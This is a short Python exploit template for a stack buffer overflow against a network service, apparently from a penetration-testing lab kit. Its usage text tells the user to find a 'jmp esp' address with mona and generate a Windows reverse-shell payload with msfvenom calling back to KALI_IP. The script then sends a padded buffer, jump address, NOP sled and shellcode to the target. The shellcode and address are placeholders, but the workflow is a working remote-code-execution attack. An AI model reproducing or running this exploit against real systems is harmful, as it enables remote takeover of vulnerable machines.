#!/usr/bin/env python3

import socket, time, sys

if(len(sys.argv) < 5):
  print("Do not forget to run !mona jmp -r esp -cpb \"badchars\"")
  print("From that find jump address")
  print("Get shellcode using:")
  print("msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=PORT EXITFUNC=thread -f c -a x86 -b \"badchars\"")
  print("In the code, put shellcode in shellcode var, and fump address instead of jmp_addr")
  print("Run the code")
  print("Usage: ./exploit.py IP Port prefix offset")
  sys.exit(1)

ip = str(sys.argv[1])
port = int(sys.argv[2])
prefix = str(sys.argv[3]) + " "
offset = int(sys.argv[4])
shellcode = ("<SHELLCODE HERE>")

timeout = 5


string = prefix + "A" * offset + "<JUMP ADDRESS HERE>" + "\x90"*32 + shellcode

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Crashed")
    sys.exit(0)
		
